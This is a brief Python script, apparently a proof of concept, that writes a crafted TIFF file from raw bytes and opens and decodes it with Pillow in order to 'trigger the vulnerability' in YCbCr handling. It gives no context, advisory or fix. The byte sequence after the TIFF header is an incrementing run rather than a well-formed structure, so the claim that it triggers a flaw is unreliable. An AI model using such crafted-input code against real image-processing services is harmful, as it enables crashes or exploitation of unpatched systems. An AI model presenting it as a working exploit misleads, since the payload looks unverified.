from PIL import Image

# Create a crafted YCbCr file
with open("crafted_tiff.tif", "wb") as f:
    f.write(b"\x49\x49\x2A\x00\x10\x00\x00\x00\x11\x00\x12\x00\x13\x00\x14\x00\x15\x00\x16\x00\x17\x00\x18\x00\x19\x00\x1A\x00")

# Open the crafted file using Pillow
img = Image.open("crafted_tiff.tif")

# Trigger the vulnerability by decoding the file
img.load()